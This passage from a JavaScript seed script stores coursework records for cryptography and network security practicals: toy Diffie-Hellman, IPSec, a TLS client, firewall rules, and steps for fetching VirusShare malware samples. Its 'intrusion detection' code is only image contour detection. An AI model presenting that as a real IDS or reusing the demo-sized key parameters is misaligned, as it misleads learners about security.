    original_question: 'A Key Exchange Using Diffine Hellmen Implement The Diffine Hellman Key Exchange Algorithm To Security Exchange Key Between Two Entities Over An Insecure Network.',
    programming_language: 'Python',
    corrected_code: `import secrets

def diffie_hellman_exchange():
    """
    Simulates the Diffie-Hellman Key Exchange between two parties: Alice and Bob.
    """
    # 1. Publicly known variables
    # Agreed upon over an insecure channel
    # In real applications, P is a massive prime number.
    # For this practical, we will use a smaller prime number.
    P = 997  # Prime Modulus
    G = 7    # Generator (Primitive root modulo P)

    print("=== 1. Public Parameters (Visible to any eavesdropper) ===")
    print(f"Prime Modulus (P): {P}")
    print(f"Generator (G):     {G}\\n")

    # 2. Alice's Setup
    # Alice generates her private key 'a' and calculates her public key 'A'
    a = secrets.randbelow(P - 2) + 1
    A = pow(G, a, P)

    print("=== 2. Alice's Operations ===")
    print(f"Alice's Private Key (a): {a} <-- (Kept completely secret)")
    print(f"Alice's Public Key (A):  {A} <-- (Sent to Bob over network)\\n")

    # 3. Bob's Setup
    # Bob generates his private key 'b' and calculates his public key 'B'
    b = secrets.randbelow(P - 2) + 1
    B = pow(G, b, P)

    print("=== 3. Bob's Operations ===")
    print(f"Bob's Private Key (b):   {b} <-- (Kept completely secret)")
    print(f"Bob's Public Key (B):    {B} <-- (Sent to Alice over network)\\n")

    # 4. Exchange & Shared Secret Calculation
    # Alice calculates the secret using Bob's public key and her private key
    alice_shared_secret = pow(B, a, P)

    # Bob calculates the secret using Alice's public key and his private key
    bob_shared_secret = pow(A, b, P)

    print("=== 4. Shared Secret Calculation (Done locally by each party) ===")
    print(f"Alice calculates shared secret: {alice_shared_secret}")
    print(f"Bob calculates shared secret:   {bob_shared_secret}\\n")

    # 5. Verification
    print("=== 5. Verification ===")
    if alice_shared_secret == bob_shared_secret:
        print("Success! Both parties have established the exact same symmetric key.")
        print("They can now use this key to encrypt future messages (e.g., using AES).")
    else:
        print("Error! The keys do not match.")

diffie_hellman_exchange()`,
    original_code: `import secrets
def diffie_hellman_exchange():
"""
Simulates the Diffie-Hellman Key Exchange between two parties: Alice and Bob. """
P = 997 # Prime Modulus
G = 7 # Generator (Primitive root modulo P)
...`,
    expected_output: `=== 1. Public Parameters (Visible to any eavesdropper) ===
Prime Modulus (P): 997
Generator (G):     7

=== 2. Alice's Operations ===
Alice's Private Key (a): 323 <-- (Kept completely secret)
Alice's Public Key (A):  781 <-- (Sent to Bob over network)

=== 3. Bob's Operations ===
Bob's Private Key (b):   73  <-- (Kept completely secret)
Bob's Public Key (B):    280 <-- (Sent to Alice over network)

=== 4. Shared Secret Calculation (Done locally by each party) ===
Alice calculates shared secret: 96
Bob calculates shared secret:   96

=== 5. Verification ===
Success! Both parties have established the exact same symmetric key.
They can now use this key to encrypt future messages (e.g., using AES).`,
    algorithm_steps: [
      'Agree on public prime modulus `P = 997` and primitive root generator `G = 7`.',
      'Alice selects a secret random integer `a` in `[1, P-2]` and computes public key `A = (G^a) mod P`.',
      'Bob selects a secret random integer `b` in `[1, P-2]` and computes public key `B = (G^b) mod P`.',
      'Alice and Bob exchange `A` and `B` over the insecure channel.',
      'Alice computes `alice_shared_secret = (B^a) mod P` and Bob computes `bob_shared_secret = (A^b) mod P`; verify both equal `(G^(a*b)) mod P`.'
    ],
    procedure_steps: [],
    instructions: 'Uses Python standard library `secrets`. Added the top-level call `diffie_hellman_exchange()` at the end of the file so executing the script produces the output shown on page 9.',
    keywords: ['diffie hellman', 'diffine hellman', 'diffine hellmen', 'key exchange', 'alice and bob', 'shared secret', 'secrets', 'prime modulus'],
    aliases: ['CNS Practical 5', 'Diffie-Hellman Key Exchange Python'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 8, 9],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220406',
    source_key: 'cns-prac-06',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 6,
    title: 'Configure IPSec on Network Devices (Cisco Packet Tracer)',
    original_question: 'To Configure IPSEC On Network Devices To Provide Secure Communication And Protect Against Unauthorized Access And Attacks.',
    programming_language: 'Cisco IOS CLI (Packet Tracer)',
    corrected_code: null,
    original_code: null,
    expected_output: `Cisco Packet Tracer PC Command Line 1.0
C:\\>ping 192.168.2.2
Pinging 192.168.2.2 with 32 bytes of data:
Reply from 192.168.2.2: bytes=32 time=25ms TTL=125
Ping statistics for 192.168.2.2:
    Packets: Sent = 4, Received = 1, Lost = 3 (75% loss)

C:\\>ping 192.168.1.1
Reply from 192.168.1.1: bytes=32 time<1ms TTL=255
Ping statistics for 192.168.1.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)`,
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Build the network topology in Cisco Packet Tracer with 3 routers (Router0, Router1, Router2), 2 switches (2960-24TT), and 2 end PCs (PC0 on 192.168.1.0/24 and PC1 on 192.168.2.0/24).',
      'Step 2: Open PC0 -> Desktop -> IP Configuration and set Static IP `192.168.1.2`, Subnet Mask `255.255.255.0`, Default Gateway `192.168.1.1`.',
      'Step 3: Open PC1 -> Desktop -> IP Configuration and set Static IP `192.168.2.2`, Subnet Mask `255.255.255.0`, Default Gateway `192.168.2.1`.',
      'Step 4–8: Open the Config / CLI tab on Router0, Router1, and Router2, assign IP addresses to the GigabitEthernet and Serial interfaces (`192.168.1.1/24`, `10.1.1.1`, `10.1.1.2`, `10.2.2.1`, `10.2.2.2`, `192.168.2.1/24`), and bring all interfaces up (`no shutdown`).',
      'Step 9: Verify green link lights across all Ethernet and Serial connections in the Logical topology view.',
      'Step 10–12: Configure static/OSPF routing and IPSec security policies on the routers and verify the routing table using `show ip route` in the IOS CLI.',
      'Step 13 (Output): Open Command Prompt on PC0 and PC1 and run `ping 192.168.2.2` and `ping 192.168.1.1` to verify end-to-end encrypted connectivity across the routers.'
    ],
    instructions: 'Note: In the source PDF (pages 10–13), Steps 1 through 12 consist only of "Step 1" .. "Step 12" labels above low-resolution Cisco Packet Tracer screenshots without explanatory text captions. The procedure steps above summarize the visible Packet Tracer configuration screens.',
    keywords: ['ipsec', 'cisco packet tracer', 'network devices', 'router configuration', 'ping 192.168.2.2', 'show ip route', 'secure communication'],
    aliases: ['CNS Practical 6', 'Configure IPSec on Network Devices Packet Tracer'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 10, 11, 12, 13],
    verification_status: 'verified_original',
    review_required: true
  },
  {
    id: '22222222-2222-4222-8222-222222220407',
    source_key: 'cns-prac-07',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 7,
    title: 'Web Security with SSL/TLS (Secure Socket Connection in Python)',
    original_question: 'Web Security With SSL/TLS: Configure And Implement Secure Web Communication Using SSL/TLS Protocols Including Certificate Management And Secure Session Establishment.',
    programming_language: 'Python',
    corrected_code: `import ssl
import socket

context = ssl.create_default_context()

sock = socket.create_connection(("example.com", 443))
ssl_sock = context.wrap_socket(sock, server_hostname="example.com")

request = (
    "GET / HTTP/1.1\\r\\n"
    "Host: example.com\\r\\n"
    "Connection: close\\r\\n"
    "\\r\\n"
)

ssl_sock.sendall(request.encode())
response = b""

while True:
    data = ssl_sock.recv(4096)
    if not data:
        break
    response += data

ssl_sock.close()
headers, body = response.split(b"\\r\\n\\r\\n", 1)
print(headers.decode("utf-8"))`,
    original_code: `import ssl import
socket
context = ssl.create_default_context()
sock = socket.create_connection(("example.com", 443)) ssl_sock =
context.wrap_socket(sock, server_hostname="example.com")
request = (
"GET / HTTP/1.1\\r\\n"
"Host: example.com\\r\\n"
"Connection: close\\r\\n"
"\\r\\n"
)
ssl_sock.sendall(request.encode())
response = b""
while True:
data = ssl_sock.recv(4096)
if not data: break
response += data ssl_sock.close() headers,
body = response.split(b"\\r\\n\\r\\n", 1)
print(headers.decode("utf-8"))`,
    expected_output: `HTTP/1.1 200 OK
Date: Wed, 01 Jul 2026 03:15:25 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: close
Server: cloudflare
Last-Modified: Tue, 30 Jun 2026 20:56:01 GMT
Allow: GET, HEAD
Accept-Ranges: bytes
Age: 13994
cf-cache-status: HIT`,
    algorithm_steps: [
      'Create a default SSL/TLS context with certificate verification enabled via `ssl.create_default_context()`.',
      'Open a TCP connection to `("example.com", 443)` using `socket.create_connection()`.',
      'Wrap the TCP socket in an SSL/TLS session via `context.wrap_socket(sock, server_hostname="example.com")`.',
      'Send an HTTP/1.1 GET request over the encrypted socket and read 4096-byte chunks until EOF.',
      'Close the SSL socket, split the HTTP response at `b"\\r\\n\\r\\n"`, and print the response headers.'
    ],
    procedure_steps: [],
    instructions: 'Uses Python standard library `ssl` and `socket` modules. Fixed line-wrapping on `while True:` loop and `ssl_sock.close()`.',
    keywords: ['ssl', 'tls', 'ssl/tls', 'web security', 'create_default_context', 'wrap_socket', 'example.com', 'port 443', 'https'],
    aliases: ['CNS Practical 7', 'Web Security with SSL/TLS Python'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 14],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220408',
    source_key: 'cns-prac-08',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 8,
    title: 'Intrusion Detection System (IDS) Using OpenCV in Python',
    original_question: 'Intrusion Detection System: Setup And Configure An Intrusion Detection (IDS) To Monitor Network Traffic And Detact Potential Security Breaches Or Malicious Activities.',
    programming_language: 'Python',
    corrected_code: `import cv2
import numpy as np
from IPython.display import Image, display

img = cv2.imread("/content/shinchan.webp")
if img is None:
    print("Error: Image not found.")
    exit()

gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
thresh = cv2.threshold(
    gray, 170, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU
)[1]

kernel = np.ones((10, 10), np.uint8)
eroded = cv2.erode(thresh, kernel, iterations=2)
dilated = cv2.dilate(eroded, kernel, iterations=2)

contours, _ = cv2.findContours(
    dilated, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE
)

intrusion_detected = False
for contour in contours:
    x, y, w, h = cv2.boundingRect(contour)
    aspect_ratio = float(w) / h
    area = cv2.contourArea(contour)
    if aspect_ratio > 1.5 and area > 500:
        # Draw a green bounding box
        cv2.rectangle(img, (x, y), (x + w, y + h), (0, 255, 0), 2)
        print(
            f"Intrusion detected at location: ({x}, {y}) "
            f"with width: {w} and height: {h}"
        )
        intrusion_detected = True

cv2.imwrite("output.jpg", img)

if intrusion_detected:
    print("Intrusion Detected")
else:
    print("No intrusion detected.")

print("Displaying the output image:")
display(Image(filename="output.jpg"))`,
    original_code: `import cv2 import numpy as np from
IPython.display import Image, display img =
cv2.imread("/content/shinchan.webp")
if img is None: print("Error:
Image not found.") exit()
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
thresh = cv2.threshold(
gray, 170, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU
)[1]
kernel = np.ones((10, 10), np.uint8)
eroded = cv2.erode(thresh, kernel, iterations=2) dilated
= cv2.dilate(eroded, kernel, iterations=2)
contours, _ = cv2.findContours(
dilated, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE
)
intrusion_detected = False
for contour in contours: x, y, w, h =
cv2.boundingRect(contour)
aspect_ratio = float(w) / h area =
cv2.contourArea(contour)
if aspect_ratio > 1.5 and area > 500:
    # Draw a green bounding box
    cv2.rectangle(img, (x, y), (x + w, y + h), (0, 255, 0), 2)
print( f"Intrusion detected at location: ({x}, {y}) "
       f"with width: {w} and height: {h}" )
    intrusion_detected = True
cv2.imwrite("output.jpg", img)
if intrusion_detected:
print("Intrusion Detected") else:
print("No intrusion detected.")
print("Displaying the output image:")
display(Image(filename="output.jpg"))`,
    expected_output: `Intrusion detected at location: (602, 120) with width: 504 and height: 202
Intrusion Detected
Displaying the output image:`,
    algorithm_steps: [
      'Read the input frame (`/content/shinchan.webp`) using `cv2.imread()` and convert it to grayscale via `cv2.cvtColor()`.',
      'Apply Otsu inverse binary thresholding (`cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU`).',
      'Perform morphological erosion and dilation with a 10x10 kernel to remove noise.',
      'Extract external contours via `cv2.findContours()` and compute bounding box `(x, y, w, h)`, `aspect_ratio`, and `area`.',
      'If `aspect_ratio > 1.5` and `area > 500`, draw a green bounding rectangle, log the coordinates, and flag `intrusion_detected = True`.'
    ],
    procedure_steps: [],
    instructions: 'Designed for Google Colab / Jupyter (`IPython.display`, `opencv-python`, `numpy`). Fixed indentation inside the `if aspect_ratio > 1.5 and area > 500:` block.',
    keywords: ['intrusion detection system', 'ids', 'opencv', 'cv2', 'findcontours', 'boundingrect', 'shinchan.webp', 'security breaches'],
    aliases: ['CNS Practical 8', 'Intrusion Detection System Python OpenCV'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 15, 16],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220409',
    source_key: 'cns-prac-09',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 9,
    title: 'Malware Analysis and Detection Using Antivirus Tools (VirusShare & VirusTotal)',
    original_question: 'Malware Analysis and Detection: Analyze and Identity malware samples using antivirus tools, analyze their behavior and develop counter measures to mitigate their impact.',
    programming_language: 'Security Tools (VirusShare & VirusTotal)',
    corrected_code: null,
    original_code: null,
    expected_output: 'VirusTotal multi-engine scan report displaying MD5/SHA-1/SHA-256 file hashes, PE32 executable metadata, and security vendor detection status across 70+ antivirus engines.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Open the browser and go to `https://www.virusshare.com` to inspect or download a sample archive for analysis.',
      'Step 2: Click the download icon to download the sample in `.zip` format.',
      'Step 3: Open `https://www.virustotal.com` in the browser to analyze the file.',
      'Step 4: Click "Choose File", select the downloaded `.zip` archive from the local folder, and review the multi-vendor detection and behavior analysis tabs.'
    ],
    instructions: 'Always analyze unknown files inside an isolated sandbox or via online hash/file scanners like VirusTotal without executing untrusted binaries on the host OS.',
    keywords: ['malware analysis', 'malware detection', 'antivirus tools', 'virusshare', 'virustotal', 'virustotal.com', 'virusshare.com'],
    aliases: ['CNS Practical 9', 'Malware Analysis and Detection VirusTotal'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 17, 18],
    verification_status: 'verified_original',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220410',
    source_key: 'cns-prac-10',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 10,
    title: 'Firewall Configuration and Rule-Based Filtering (Windows Defender Firewall)',
    original_question: 'Firewall Configuration and Rule-based Filtering: Configure and test firewall rules to control network traffic, filter packets based on specified criteria, and protect network resources from unauthorized access.',
    programming_language: 'Windows CMD / Windows Defender Firewall',
    corrected_code: `# Part B Step 2: Resolve IPv4 and IPv6 addresses of target website
nslookup android.com`,
    original_code: `C:\\Users\\admin>nslookup android.com
Server:  Unknown
Address:  192.168.116.1

Non-authoritative answer:
Name:    android.com
Addresses:  2404:6800:4009:806::2004
          142.250.71.100`,
    expected_output: `Part A: Browser displays "Your Internet access is blocked" when TCP ports 80 and 443 are blocked in Inbound and Outbound Rules.\nPart B: Browser displays "This site can't be reached" when accessing www.android.com after blocking 142.250.71.100 and 2404:6800:4009:806::2004.`,
    algorithm_steps: [],
    procedure_steps: [
      '--- Part A: Blocking HTTP/HTTPS Traffic by Port (TCP 80, 443) ---',
      'Step 1: Open Control Panel -> System and Security -> Windows Defender Firewall.',
      'Step 2: Click on "Advanced settings" in the left pane to open "Windows Defender Firewall with Advanced Security".',
      'Step 3: Click on "Inbound Rules" in the left tree.',
      'Step 4: Click "New Rule..." in the right Actions pane.',
      'Step 5: Select the "Port" radio button, click Next, select "TCP", choose "Specific local ports", enter `80, 443`, and click Next.',
      'Step 6: Select "Block the connection" and click Next.',
      'Step 7: Keep Domain, Private, and Public profiles checked and click Next.',
      'Step 8–9: Name the rule `httpblock` and click Finish to add the Inbound rule.',
      'Step 10 (Outbound Rules): Click "Outbound Rules" -> "New Rule...", select "Port" -> "TCP" -> Specific remote ports `80, 443` -> "Block the connection" -> check all profiles -> name it `httpblock` -> click Finish, then test in a browser to verify internet access on ports 80/443 is blocked.',
      '--- Part B: Blocking a Specific Website (www.android.com) by IP Address ---',
      'Step 1: Open `www.android.com` in a browser to confirm it is currently accessible.',
      'Step 2: Open Command Prompt and run `nslookup android.com` to find its IPv4 (`142.250.71.100`) and IPv6 (`2404:6800:4009:806::2004`) addresses.',
      'Step 3: Open Windows Defender Firewall with Advanced Security -> Inbound Rules -> New Rule..., select "Custom", and click Next.',
      'Step 4: On the Scope step, under remote IP addresses, select "These IP addresses", click Add, and insert both `2404:6800:4009:806::2004` and `142.250.71.100`.',
      'Step 5–6: Select "Block the connection", name the rule `block android`, and click Finish.',
      'Step 7: Repeat Steps 3–6 under "Outbound Rules" (Custom -> All programs -> Scope remote IPs `2404:6800:4009:806::2004` and `142.250.71.100` -> Block the connection -> name `block android`), then refresh `www.android.com` to confirm it is blocked.'
    ],
    instructions: 'Remember to disable or delete the test `httpblock` and `block android` rules in Windows Defender Firewall after completing the practical.',
    keywords: ['firewall', 'windows defender firewall', 'inbound rules', 'outbound rules', 'rule-based filtering', 'port 80', 'port 443', 'httpblock', 'nslookup', 'android.com'],
    aliases: ['CNS Practical 10', 'Firewall Configuration and Rule-Based Filtering'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28],
    verification_status: 'verified_original',
    review_required: false
  }
];

const manifest = {
  project: 'Practical Code Finder',
  version: '1.0.0',
  generated_at: '2026-10-23T07:45:00Z',
  summary: {
    total_subjects: subjects.length,
    total_practicals: practicals.length,
    counts_by_subject: {
      'artificial-intelligence': practicals.filter(p => p.subject_slug === 'artificial-intelligence').length,
      'ethical-hacking': practicals.filter(p => p.subject_slug === 'ethical-hacking').length,
      'software-testing-and-quality-assurance': practicals.filter(p => p.subject_slug === 'software-testing-and-quality-assurance').length,
      'cryptography-and-network-security': practicals.filter(p => p.subject_slug === 'cryptography-and-network-security').length
    },
    shared_files_extracted: [
      {
        filename: 'RMP.py',
        subject_slug: 'artificial-intelligence',
        source_pdf: 'final_AI__3f2816a9.pdf',
        source_pages: [2, 3],
        used_by_practicals: [1, 2, 3, 4]
      },
      {
        filename: 'RWP.py',
        subject_slug: 'artificial-intelligence',
        source_pdf: 'final_AI__3f2816a9.pdf',
        source_pages: [3],
        used_by_practicals: [6]
      }
    ]
  },
  subjects,
  practicals
};

function sqlLiteral(val) {
  if (val === null || val === undefined) return 'NULL';
  if (typeof val === 'boolean') return val ? 'TRUE' : 'FALSE';
  if (typeof val === 'number') return String(val);
  return "'" + String(val).replace(/'/g, "''") + "'";
}

function sqlTextArray(arr) {
  if (!arr || arr.length === 0) return "'{}'::text[]";
  return 'ARRAY[' + arr.map(item => sqlLiteral(item)).join(', ') + ']::text[]';
}

function sqlIntArray(arr) {
  if (!arr || arr.length === 0) return "'{}'::integer[]";
  return 'ARRAY[' + arr.map(item => Number(item)).join(', ') + ']::integer[]';
}

function sqlJsonb(val) {
  return sqlLiteral(JSON.stringify(val || [])) + '::jsonb';
}

function generateSeedSql() {
  const lines = [
    '-- ============================================================================',
    '-- PRACTICAL CODE FINDER - SEED & IMPORT SQL',
    '-- Generated directly from the 4 verified practical PDFs:',
    '--   1. final_AI__3f2816a9.pdf (9 practicals + RMP.py & RWP.py)',
    '--   2. final_ethical_hacking_607197eb.pdf (10 practicals)',
    '--   3. final_STQA_b89bf2f3.pdf (10 practicals)',
    '--   4. finalCNS_69f47646.pdf (10 practicals)',
    '-- Total: 4 Subjects, 39 Practicals.',
    '-- Safe to re-run (idempotent via ON CONFLICT DO UPDATE where review_required = false).',
    '-- ============================================================================',
    '',
    'BEGIN;',
    '',
    '-- 1. Upsert Subjects',
    'INSERT INTO public.subjects (id, name, slug, description)',
    'VALUES'
  ];

  lines.push(
    subjects
      .map(
        s =>
          `  (${sqlLiteral(s.id)}, ${sqlLiteral(s.name)}, ${sqlLiteral(s.slug)}, ${sqlLiteral(s.description)})`
      )
      .join(',\n') +
      '\nON CONFLICT (slug) DO UPDATE SET\n  name = EXCLUDED.name,\n  description = EXCLUDED.description;\n'
  );

  lines.push('-- 2. Upsert Practicals (preserves manually reviewed records on retry)');
  for (const p of practicals) {
    lines.push(
      `INSERT INTO public.practicals (
  id, source_key, subject_id, practical_number, title, original_question,
  corrected_code, original_code, programming_language, expected_output,
  algorithm_steps, procedure_steps, instructions, keywords, aliases,
  source_pdf, source_pages, verification_status, review_required, is_published
) VALUES (
  ${sqlLiteral(p.id)},
  ${sqlLiteral(p.source_key)},
  ${sqlLiteral(p.subject_id)},
  ${sqlLiteral(p.practical_number)},
  ${sqlLiteral(p.title)},
  ${sqlLiteral(p.original_question)},
  ${sqlLiteral(p.corrected_code)},
  ${sqlLiteral(p.original_code)},
  ${sqlLiteral(p.programming_language)},
  ${sqlLiteral(p.expected_output)},
  ${sqlJsonb(p.algorithm_steps)},
  ${sqlJsonb(p.procedure_steps)},
  ${sqlLiteral(p.instructions)},
  ${sqlTextArray(p.keywords)},
  ${sqlTextArray(p.aliases)},
  ${sqlLiteral(p.source_pdf)},
  ${sqlIntArray(p.source_pages)},
  ${sqlLiteral(p.verification_status)},
  ${sqlLiteral(p.review_required)},
  TRUE
)
ON CONFLICT (source_key) DO UPDATE SET
  title = EXCLUDED.title,
  original_question = EXCLUDED.original_question,
  corrected_code = CASE WHEN public.practicals.verification_status = 'verified_tested' THEN public.practicals.corrected_code ELSE EXCLUDED.corrected_code END,
  original_code = EXCLUDED.original_code,
  programming_language = EXCLUDED.programming_language,
  expected_output = EXCLUDED.expected_output,
  algorithm_steps = EXCLUDED.algorithm_steps,
  procedure_steps = EXCLUDED.procedure_steps,
  instructions = EXCLUDED.instructions,
  keywords = EXCLUDED.keywords,
  aliases = EXCLUDED.aliases,
  source_pdf = EXCLUDED.source_pdf,
  source_pages = EXCLUDED.source_pages,
  updated_at = NOW();
`
    );
  }

  lines.push('-- 3. Populate practical_search_terms from keywords & aliases');
  lines.push('DELETE FROM public.practical_search_terms;');
  lines.push(
    `INSERT INTO public.practical_search_terms (practical_id, term, term_type)
SELECT p.id, unnest(p.keywords), 'keyword'
FROM public.practicals p
UNION ALL
SELECT p.id, unnest(p.aliases), 'alias'
FROM public.practicals p
ON CONFLICT DO NOTHING;`
  );

  lines.push('');
  lines.push('COMMIT;');
  lines.push('');
  lines.push('-- Verification Queries:');
  lines.push('-- SELECT s.name, COUNT(p.id) AS practical_count FROM public.subjects s LEFT JOIN public.practicals p ON p.subject_id = s.id GROUP BY s.name ORDER BY s.name;');
  return lines.join('\n');
}

fs.mkdirSync('data', { recursive: true });
fs.mkdirSync('public/data', { recursive: true });
fs.mkdirSync('sql', { recursive: true });
fs.mkdirSync('public/sql', { recursive: true });

const manifestJson = JSON.stringify(manifest, null, 2);
fs.writeFileSync(path.join('data', 'extraction_manifest.json'), manifestJson, 'utf8');
fs.writeFileSync(path.join('public/data', 'extraction_manifest.json'), manifestJson, 'utf8');

const seedSql = generateSeedSql();
fs.writeFileSync(path.join('sql', 'seed_import_notes.sql'), seedSql, 'utf8');
fs.writeFileSync(path.join('public/sql', 'seed_import_notes.sql'), seedSql, 'utf8');

console.log(`Generated manifest with ${subjects.length} subjects and ${practicals.length} practicals.`);
